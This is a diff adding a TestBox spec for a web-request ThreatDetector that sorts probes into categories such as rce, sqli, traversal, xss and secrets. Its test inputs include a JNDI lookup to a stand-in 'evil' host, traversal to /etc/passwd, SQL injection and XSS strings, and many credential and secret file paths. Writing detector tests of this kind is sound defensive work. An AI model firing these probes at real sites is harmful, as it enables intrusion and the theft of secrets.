@@ -1,0 +1,75 @@
+class extends="testbox.system.BaseSpec" {
+
+	function run() {
+		describe( "ThreatDetector", function(){
+
+			beforeEach( function(){
+				variables.detector = new models.util.ThreatDetector()
+				variables.label = ( path, query = "", method = "GET", ua = "Mozilla/5.0" ) => detector.classify( method, path, query, ua )
+			} )
+
+			it( "leaves this site's own pages alone", function(){
+				for ( var path in [ "/", "/posts", "/posts/2026/11/boxpress-a-working-boxlang-express-app", "/tag/cfml", "/projects/boxlang-express/docs/config",
+					"/manage", "/manage/api/posts/42", "/manage/subscribers", "/rss.cfm", "/sitemap.xml", "/assets/dist/site-ADSD6RJY.css",
+					"/assets/dist/global-DZU426P4.js.map", "/.well-known/webfinger", "/.well-known/acme-challenge/abc", "/api/v1/instance",
+					"/api/v2/instance", "/inbox", "/u/blog", "/favicon.ico", "/apple-touch-icon.png", "/auth/github/callback" ] ){
+					expect( label( path ) ).toBe( "", path )
+				}
+				expect( label( "/tag/graphql" ) ).toBe( "" )
+				expect( label( "/tag/wp-cli" ) ).toBe( "" )
+				expect( label( "/search", "q=boxlang+select+statements" ) ).toBe( "" )
+				expect( label( "/search", "q=what%27s+new+in+0.2.27" ) ).toBe( "" )
+				expect( label( "/posts", "page=2" ) ).toBe( "" )
+			} )
+
+			it( "spots config and secret files", function(){
+				for ( var path in [ "/.env", "/backend/.env", "/.env.production", "/.env.bak", "/.git/config", "/.git/HEAD", "/.aws/credentials",
+					"/.svn/entries", "/.s3cfg", "/docker-compose.yml", "/terraform.tfstate", "/.github/workflows/deploy.yml", "/settings.py",
+					"/config.php.bak", "/secrets.json", "/ssl/server.key", "/storage/logs/laravel.log", "/backup.zip", "/.DS_Store",
+					"/.env_1", "/.idea/WebServers.xml", "/.vscode/launch.json", "/.next/server/pages/index.js", "/manage/.env", "/env",
+					"/localhost.key", "/google-credentials.json", "/settings/api-keys", "/config/database.json", "/firebase-adminsdk.json", "/next.config.js", "/service_account.json" ] ){
+					expect( label( path ) ).toBe( "secrets", path )
+				}
+			} )
+
+			it( "sorts the other probes into their categories", function(){
+				expect( label( "/wp-login.php" ) ).toBe( "wordpress" )
+				expect( label( "/xmlrpc.php", "", "POST" ) ).toBe( "wordpress" )
+				expect( label( "/actuator/configprops" ) ).toBe( "admin" )
+				expect( label( "/actuator/env" ) ).toBe( "admin" )
+				expect( label( "/telescope/requests" ) ).toBe( "admin" )
+				expect( label( "/server-status" ) ).toBe( "admin" )
+				expect( label( "/phpmyadmin/" ) ).toBe( "admin" )
+				expect( label( "/info.php" ) ).toBe( "php" )
+				expect( label( "/phpinfo" ) ).toBe( "php" )
+				expect( label( "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", "POST" ) ).toBe( "rce" )
+				expect( label( "/cgi-bin/php", "", "POST" ) ).toBe( "rce" )
+				expect( label( "/", "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D" ) ).toBe( "rce" )
+				expect( label( "/api/proc/self/environ" ) ).toBe( "traversal" )
+				expect( label( "/static/%2e%2e/%2e%2e/etc/passwd" ) ).toBe( "traversal" )
+				expect( label( "/files/%252e%252e%252fetc" ) ).toBe( "traversal" )
+				expect( label( "/search", "q=1%27+UNION+SELECT+password+FROM+User--" ) ).toBe( "sqli" )
+				expect( label( "/posts", "page=1+AND+SLEEP(5)" ) ).toBe( "sqli" )
+				expect( label( "/search", "q=%3Cscript%3Ealert(1)%3C/script%3E" ) ).toBe( "xss" )
+				expect( label( "/", "", "GET", "sqlmap/1.7 (https://sqlmap.org)" ) ).toBe( "scanner" )
+				expect( label( "/", "", "GET", "Mozilla/5.0 zgrab/0.x" ) ).toBe( "scanner" )
+				expect( label( "/", "", "PROPFIND" ) ).toBe( "method" )
+			} )
+
+			it( "counts an injection inside a probe as the injection", function(){
+				expect( label( "/index.php", "id=1%20union%20select%201" ) ).toBe( "sqli" )
+			} )
+
+			it( "survives a malformed escape", function(){
+				expect( label( "/search", "q=50%" ) ).toBe( "" )
+				expect( label( "/%zz/.env" ) ).toBe( "secrets" )
+			} )
+
+			it( "names every category it can return", function(){
+				expect( detector.categories().map( ( c ) => c.id ).toList() ).toBe( "rce,sqli,traversal,xss,secrets,wordpress,admin,php,scanner,method" )
+			} )
+
+		} )
+	}
+
+}
